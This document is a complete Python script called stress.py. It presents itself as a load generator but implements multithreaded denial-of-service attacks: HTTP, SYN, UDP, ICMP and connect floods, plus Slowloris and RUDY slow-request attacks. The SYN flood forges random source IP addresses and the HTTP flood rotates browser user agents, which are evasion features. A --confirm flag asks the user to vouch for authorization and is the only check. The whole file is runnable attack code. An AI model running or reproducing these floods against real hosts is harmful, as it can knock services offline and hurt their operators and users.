#!/usr/bin/env python3
# stress.py — multi-vector load generator
# usage: python3 stress.py <target> [options]
#   python3 stress.py 10.0.0.5 -p 80 -t 400 -d 60 -m http syn udp slowloris
import argparse, socket, threading, random, time, sys, os, ssl, struct
from concurrent.futures import ThreadPoolExecutor, as_completed

DEFAULT_PORT = 80
DEFAULT_THREADS = 200
DEFAULT_DURATION = 60

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
]

PATHS = ["/", "/index.html", "/api/v1/status", "/login", "/search?q=test",
         "/assets/app.js", "/favicon.ico", "/robots.txt"]

class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.sent = 0
        self.errs = 0
        self.bytes = 0
    def add(self, n=1, b=0, err=False):
        with self.lock:
            self.sent += n
            self.bytes += b
            if err: self.errs += 1
    def snap(self):
        with self.lock:
            return self.sent, self.errs, self.bytes

STATS = Stats()
STOP = threading.Event()

def rnd_ip():
    return f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def http_flood(host, port, use_ssl, duration):
    end = time.time() + duration
    while time.time() < end and not STOP.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((host, port))
            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host)
            method = random.choice(["GET", "GET", "GET", "POST"])
            path = random.choice(PATHS) + f"?r={random.randint(0,999999)}"
            ua = random.choice(USER_AGENTS)
            if method == "POST":
                body = os.urandom(random.randint(64, 512)).hex()
                req = (f"POST {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\n"
                       f"Content-Type: application/x-www-form-urlencoded\r\n"
                       f"Content-Length: {len(body)}\r\nConnection: keep-alive\r\n\r\n{body}")
            else:
                req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\n"
                       f"Accept: */*\r\nConnection: keep-alive\r\n\r\n")
            s.send(req.encode())
            STATS.add(1, len(req))
            s.close()
        except Exception:
            STATS.add(0, 0, err=True)

def syn_flood(host, port, duration):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    except PermissionError:
        return connect_flood(host, port, duration)
    end = time.time() + duration
    while time.time() < end and not STOP.is_set():
        try:
            src = rnd_ip()
            sport = random.randint(1024, 65535)
            seq = random.randint(0, 0xFFFFFFFF)
            ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0x00, 0x0028, 0x0000, 0x0000, 0x40, 0x06, 0x0000,
                             socket.inet_aton(src), socket.inet_aton(host))
            tcp = struct.pack("!HHIIBBHHH", sport, port, seq, 0, 0x50, 0x02, 0x1000, 0x0000, 0x0000)
            pseudo = socket.inet_aton(src) + socket.inet_aton(host) + struct.pack("!BBH", 0, 6, len(tcp))
            chk = 0
            for i in range(0, len(pseudo + tcp), 2):
                w = (pseudo + tcp)[i] << 8 | ((pseudo + tcp)[i+1] if i+1 < len(pseudo+tcp) else 0)
                chk += w
            chk = (chk >> 16) + (chk & 0xffff)
            chk = ~chk & 0xffff
            tcp = tcp[:16] + struct.pack("!H", chk) + tcp[18:]
            s.sendto(ip + tcp, (host, 0))
            STATS.add(1, 40)
        except Exception:
            STATS.add(0, 0, err=True)
    s.close()

def connect_flood(host, port, duration):
    end = time.time() + duration
    while time.time() < end and not STOP.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((host, port))
            STATS.add(1, 0)
            s.close()
        except Exception:
            STATS.add(0, 0, err=True)

def udp_flood(host, port, duration):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end = time.time() + duration
    while time.time() < end and not STOP.is_set():
        try:
            payload = os.urandom(random.randint(512, 1400))
            s.sendto(payload, (host, port))
            STATS.add(1, len(payload))
        except Exception:
            STATS.add(0, 0, err=True)
    s.close()

def slowloris(host, port, use_ssl, duration):
    socks = []
    end = time.time() + duration
    for _ in range(50):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((host, port))
            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host)
            s.send(f"GET /?r={random.randint(0,9999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {host}\r\n".encode())
            socks.append(s)
            STATS.add(1, 0)
        except Exception:
            STATS.add(0, 0, err=True)
    while time.time() < end and not STOP.is_set():
        for s in list(socks):
            try:
                s.send(f"X-a: {random.randint(1,9999)}\r\n".encode())
                STATS.add(1, 0)
            except Exception:
                socks.remove(s)
                STATS.add(0, 0, err=True)
        time.sleep(10)
    for s in socks:
        try: s.close()
        except: pass

def rudy(host, port, use_ssl, duration):
    end = time.time() + duration
    while time.time() < end and not STOP.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((host, port))
            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host)
            body_len = random.randint(10000, 100000)
            s.send(f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: {body_len}\r\n".encode())
            s.send(b"Content-Type: application/x-www-form-urlencoded\r\n\r\n")
            sent = 0
            while sent < body_len and time.time() < end and not STOP.is_set():
                s.send(b"a")
                sent += 1
                STATS.add(1, 1)
                time.sleep(0.5)
            s.close()
        except Exception:
            STATS.add(0, 0, err=True)

def icmp_flood(host, duration):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        return
    end = time.time() + duration
    while time.time() < end and not STOP.is_set():
        try:
            pkt = struct.pack("!BBHHH", 8, 0, 0, random.randint(0,65535), 1) + os.urandom(56)
            chk = 0
            for i in range(0, len(pkt), 2):
                chk += (pkt[i] << 8) | (pkt[i+1] if i+1 < len(pkt) else 0)
            chk = (chk >> 16) + (chk & 0xffff)
            chk = ~chk & 0xffff
            pkt = pkt[:2] + struct.pack("!H", chk) + pkt[4:]
            s.sendto(pkt, (host, 0))
            STATS.add(1, len(pkt))
        except Exception:
            STATS.add(0, 0, err=True)
    s.close()

METHODS = {
    "http":      lambda h,p,d,ssl: http_flood(h,p,ssl,d),
    "syn":       lambda h,p,d,ssl: syn_flood(h,p,d),
    "connect":   lambda h,p,d,ssl: connect_flood(h,p,d),
    "udp":       lambda h,p,d,ssl: udp_flood(h,p,d),
    "slowloris": lambda h,p,d,ssl: slowloris(h,p,ssl,d),
    "rudy":      lambda h,p,d,ssl: rudy(h,p,ssl,d),
    "icmp":      lambda h,p,d,ssl: icmp_flood(h,d),
}

def progress(duration):
    start = time.time()
    while time.time() - start < duration and not STOP.is_set():
        elapsed = time.time() - start
        sent, errs, byts = STATS.snap()
        rate = sent / max(elapsed, 0.01)
        sys.stdout.write(f"\r  {elapsed:5.1f}s/{duration}s  sent={sent:>8}  errs={errs:>6}  "
                        f"rate={rate:>8.0f}/s  bytes={byts/1e6:>6.1f}MB")
        sys.stdout.flush()
        time.sleep(0.5)
    print()

def main():
    p = argparse.ArgumentParser(description="multi-vector load generator")
    p.add_argument("target", help="target host or IP")
    p.add_argument("-p", "--port", type=int, default=DEFAULT_PORT)
    p.add_argument("-t", "--threads", type=int, default=DEFAULT_THREADS)
    p.add_argument("-d", "--duration", type=int, default=DEFAULT_DURATION)
    p.add_argument("-m", "--methods", nargs="+", default=["http"],
                   choices=list(METHODS.keys()))
    p.add_argument("--ssl", action="store_true", help="use TLS")
    p.add_argument("--confirm", action="store_true", help="confirm authorized target")
    args = p.parse_args()

    if not args.confirm:
        print("refusing: pass --confirm (target must be yours or authorized)")
        sys.exit(1)

    port = args.port
    if args.ssl and port == 80:
        port = 443

    print(f"target={args.target} port={port} threads={args.threads} "
          f"duration={args.duration}s methods={args.methods} ssl={args.ssl}")

    with ThreadPoolExecutor(max_workers=args.threads) as pool:
        per = max(1, args.threads // len(args.methods))
        futs = []
        for m in args.methods:
            fn = METHODS[m]
            for _ in range(per):
                futs.append(pool.submit(fn, args.target, port, args.duration, args.ssl))
        progress(args.duration)
        STOP.set()
        for f in as_completed(futs, timeout=5):
            try: f.result()
            except Exception: pass

    sent, errs, byts = STATS.snap()
    print(f"\n  TOTAL sent={sent}  errs={errs}  bytes={byts/1e6:.1f}MB  "
          f"avg={sent/max(args.duration,1):.0f}/s")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        STOP.set()
        print("\n  interrupted.")
